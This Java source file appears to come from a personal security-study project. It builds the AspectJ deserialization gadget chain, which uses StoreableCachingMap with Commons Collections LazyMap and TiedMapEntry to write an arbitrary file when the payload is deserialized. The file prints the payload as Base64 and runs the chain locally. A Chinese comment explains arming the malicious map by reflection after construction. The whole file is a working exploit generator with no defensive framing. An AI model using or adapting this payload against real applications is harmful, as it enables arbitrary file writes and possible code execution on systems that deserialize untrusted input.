
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class AspectjExp {
    public static void main(String[] args) throws Exception {
        String fileName    = "Test.txt";
        String filePath    = "D:\\Projects\\my_p\\java-sec\\Serialization\\aspectj\\src\\main\\java";
        String fileContent = "bupt666";
        byte[] bytes = fileContent.getBytes();

        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");

        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class, int.class);
        declaredConstructor.setAccessible(true);
        Map o = (Map) declaredConstructor.newInstance(filePath, 1);

        Map lazyMap = LazyMap.decorate(o, new ConstantTransformer(bytes));

        HashMap<Object, Object> hashMap = new HashMap<>();

        //防止在序列化时就执行，所以先不填恶意的lazyMap，等序列完，再通过反射改成LazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, fileName);

        hashMap.put(tiedMapEntry,1);

        Class tiedMapEntryClass = TiedMapEntry.class;
        Field map = tiedMapEntryClass.getDeclaredField("map");
        map.setAccessible(true);
        map.set(tiedMapEntry,lazyMap);

        unserialize(serialize(hashMap));
    }

    public static void unserialize(byte[] bytes) throws Exception{
        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
            ObjectInputStream oin = new ObjectInputStream(bain)){
            oin.readObject();
        }
    }

    public static byte[] serialize(Object obj) throws Exception{
        try(ByteArrayOutputStream data = new ByteArrayOutputStream();
            ObjectOutputStream oss = new ObjectOutputStream(data)){
            oss.writeObject(obj);
            oss.flush();
            oss.close();
            System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
            return data.toByteArray();
        }
    }
}